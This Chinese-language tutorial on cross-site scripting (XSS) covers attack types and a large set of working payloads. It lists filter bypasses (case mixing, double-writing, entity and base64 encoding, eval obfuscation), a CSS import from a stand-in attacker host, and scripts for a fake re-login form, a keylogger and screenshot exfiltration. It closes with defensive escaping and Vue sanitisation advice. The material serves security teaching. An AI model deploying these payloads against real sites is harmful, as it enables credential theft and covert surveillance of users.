## A) 定义
> Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。
在部分情况下，由于输入的限制，注入的恶意脚本比较短。但可以通过引入外部的脚本，并由浏览器执行，来完成比较复杂的攻击策略（见 C-2）。

XSS 的本质是：不受信任的用户输入（恶意代码）未经处理，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行


## B) 分类
| 类型          |  区分          | 危险级别 |
| ------------- |:-------------:| --------:|
| 反射型 XSS    | 恶意代码存放于URL中，经过服务端拼接到HTML返回给客户端执行      |       中 |
| 存储型 XSS    | 恶意代码存放于数据库中，下次从数据库取出导致恶意代码执行      |       高 |
| DOM型 XSS     | 不与服务端交互，是一种通过DOM操作产生的问题|       中 |

## C) 常见的攻击Payload

### 1) 一些常见的姿势

```html
<!-- 第一类： 通过引入的方式触发：这些标签可以触发XSS -->
<script>alert(1)</script>

<iframe src="./alert.html"></iframe> <!-- 在akert.html中加入下面的script -->
<script src="./alert.js"></script>


<!-- 第二类：利用特殊事件触发XSS -->
<img src=x onerror=alert(1)>
<iframe src=”javascript:alert(1)”>
<body onload=alert(1)>
<select autofocus onfocus=alert(1)>
<svg onload=alert(1) >

<style onload=alert(1) /> <!-- 不常见，但是有用~ -->
```

```css
<!-- 利用CSS触发XSS（在IE中可行） -->
body {
    color: expression(alert('XSS'));
}
@import url("http://attacker.org/malicious.css");

// NOTE:如果import被过滤，可以使用下面这种方式进行绕过
@imp\ort url("http://attacker.org/malicious.css");
```

### 2) 如果存在长度限制

当字符串长度或某个字符被限制时，可以尝试找一些特殊字符（比如希腊的字），这样能起到1个字符代替2个字符，或者绕过安全限制的效果。

```html
<!-- 长度仅为 18 ！用于用户名等长度受到限制的场景 -->
<script/src=//⑭.₨>
```
### 3) 如果对用户输入进行了处理

如果通过正则表达式对用户输入进行了处理，都可以尝试使用以下方法绕过

#### 3.1 通过大小写绕过处理

如果没有使用toLowerCase()等方法讲用户输入全部转换为小写，那么大小写混合的方式就能轻易绕过处理程序
```html
<sCRIpt>alert(1)</sCRIPT>  <!-- 大小写绕过 -->
```

#### 3.2 通过双写绕过删除处理

那么现在服务端将所有用户输入都转换为大/小写了，上述方法就不起作用，这时观察服务端是否使用了replace()类似方法将敏感字符删除，如果有，则可以尝试以下方式

```html
<!-- 双写绕过删除 -->
<sc<script>ript>alert(1)</sc<script>ript> <!-- 如果处理了'<script>' -->
<img src=x ononerrorerror=alert(1) /> <!-- 如果处理了'onerror' -->
```

如果不是递归删除，那么处理后会分别变成 

```html
<script>alert(1)</script>
<img src=x onerror=alert(1) />
```

Nice，又成功执行了我们的代码！

#### 3.3 通过双写绕过替换处理

如果不是删除字符串，而是替换成其他字符串（比如tooyoung）呢？3.2的结果可能会变成这样

```html
<sctooyoungript>alert(1)</sctooyoungript>
<img src=x ontooyoungerror=alert(1) />
```

可惜了，浏览器不会解析这些标签和事件，所以我们不能达到预期，必须寻找其他办法，如果按照以下方式来写...

```html
<script <script>>alert(1)</script </script>> => <script tooyoung>alert(1)</script tooyoung> 
```
tooyoung 会被浏览器认为是一个不带值的属性（如autofocus），虽然没什么用，但最终也能正确解析执行

#### 3.4 通过编码绕过处理

下面的代码不匹配正则表达式，但是浏览器依旧会执行它，因为使用了html实体编码绕过
```html
<a href="java&#115;cript:alert('xss')">XSS</a> 
<input onfocus="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#49;&#39;&#41;" autofocus/>
```

base64编码绕过

```html
<script src="data:text/html;base64,YWxlcnQoJzEnKQ=="></script>
```

html实体编码了base64编码实现绕过

```html
<script src="&#100;&#97;&#116;&#97;&#58;&#116;&#101;&#120;&#116;&#47;&#104;&#116;&#109;&#108;&#59;&#98;&#97;&#115;&#101;&#54;&#52;&#44;&#89;&#87;&#120;&#108;&#99;&#110;&#81;&#111;&#74;&#122;&#69;&#110;&#75;&#81;&#61;&#61;"></script>
```

#### 3.5 eval()

如果目标系统没有将eval和replace加入黑名单，那么可以拿它们来做一些文章，eval('alert(1)')其实等同于alert(1)，但是如果直接这样写，就有画蛇添足之嫌。我们可以这样用：

```javascript
eval('~a~le~rt~~(~~1~~)~'.replace(/~/g, ''))
```
加入一些有的没的符号进行混淆，然后再将这些符号删除，从而得到我们想要的payload。
String的fromCharCode()也是个不错的选择，它可以将Unicode编码转为一个或多个字符。获取多个字符组成字符串，就可以组成我们想要的payload。

```javascript
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
```

## D) Not only 'alert(1)'
XSS就算攻击成功了，也就是一个弹窗而已吗？显然不是，来看看有哪些利用姿势

### 1) 获取Cookie，无需账号即可登录
在利用成功后，只需将Cookie传回攻击者的服务器，那么攻击者就可以利用其直接登录目标账户（如通过firefox的firebug插件），危险程度不言而喻。但是现在越来越多的开发者了解到这里的风险，在Cookie中设置了**HttpOnly**，导致客户端脚本无法获取Cookie。

### 2) 插入表单获取账号

来看下面这段代码

```javascript
let dummyFormHtml = '系统检测到你的账号存在风险，请重新输入账号密码以继续<br><input type="text" /><br><input type="password" /><br><input type="submit" value="登录" />'

document.body.innerHTML = dummyFormHtml
document.addEventListener('keypress', function (event) {
  let xhr = new XMLHttpRequest()
  xhr.open('POST', '/interface')
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')
  xhr.send('data=' + event.key)
})
```

这段代码在DOM里插入了一个表单，并带有迷惑性引导，用户认为自己处于可信网站上，所以会轻易输入自己的账户信息，这样一来，即使无法获取cookie，也能实现登录。

### 3) 记录键盘按键事件
```javascript
document.addEventListener('keypress', function (event) {
  let xhr = new XMLHttpRequest()
  xhr.open('POST', '/interface')
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')
  xhr.send('data=' + event.key)
})
```

在悄无声息的情况下记录用户按键事件，想想都有点可怕~ :(

### 4）获取用户截屏

大家对html2canvas都比较熟悉，下面代码实现每隔五秒上传一张截图到攻击者的服务器 :(

```javascript
setInterval(html2canvas(document.querySelector("body")).then(canvas => {
  let xhr = new XMLHttpRequest()
  xhr.open('POST', '/screenshot')
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')
  xhr.send('data=' + encodeURIComponent(canvas.toDataURL()))
}), 5000);
```

## E) 防御方法
我们可以使用以下代码检测网站是否有XSS漏洞
```javascript
jaVasCript: /*-/*`/*\`/*'/*"/**/ ( /* */ oNcliCk=alert() ) //%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e 
```

总结一下，引发XSS原因总结如下：
>在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。
在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。
在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。
在标签的 href、src 等属性中，包含 javascript: 等可执行代码。
在 onload、onerror、onclick 等事件中，注入不受控制代码。
在 style 属性和标签中，包含类似 background-image:url("javascript:…"); 的代码（新版本浏览器已经可以防范）。
在 style 属性和标签中，包含类似 expression(…) 的 CSS 表达式代码（新版本浏览器已经可以防范）。

所以引出两种防御方法

>1.防止 HTML 中出现注入。
2.防止 JavaScript 执行时，执行恶意代码。

所以我们可以对输出进行转义。就如何实现来说，整体的 XSS 防范是非常复杂和繁琐的，不同的上下文，如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致。我们不仅需要在全部需要转义的位置，对数据进行对应的转义。而且要防止多余和错误的转义，避免正常的用户输入出现乱码。

### 一些建议
1.采用比较成熟的框架，如 Vue/React 等。且只在可信内容上使用 v-html，永不用在用户提交的内容上。
如果必须将v-html用于用户输入上时：可以使用xss的npm包来过滤xss攻击代码
```javascript
// 引入xss包并挂载到vue原型上
import xss from 'xss';
Vue.prototype.xss = xss
```

```javascript
// 在vue.config.js中覆写html指令
chainWebpack: config => {
    config.module
        .rule("vue")
        .use("vue-loader")
        .loader("vue-loader")
        .tap(options => {
            options.compilerOptions.directives = {
                html(node, directiveMeta) {
                    (node.props || (node.props = [])).push({
                        name: "innerHTML",
                        value: `xss(_s(${directiveMeta.value}))`
                    });
                }
            };
            return options;
        });
}
```
2.使用 XSS 攻击字符串和自动扫描工具寻找潜在的 XSS 漏洞，并修复
3.对于富文本编辑器这类高度自定义的用户输入，则需要定制化的白名单过滤

#### 输出转义的效果

|目标|简单转义是否有防护作用|
|-|-|
|HTML 标签文字内容|有|
|HTML 属性值|有|
|CSS 内联样式|无|
|内联 JavaScript|无|
|内联 JSON|无|
|跳转链接|无|

## 参考来源 ：
[前端安全系列（一）：如何防止XSS攻击？](https://www.freebuf.com/articles/web/185654.html)

[他山之石 | 对 XSS 的一次深入分析认识](https://www.freebuf.com/articles/web/195507.html)

[解决v-html指令潜在的xss攻击](https://blog.csdn.net/lingxiaoxi_ling/article/details/105851736)
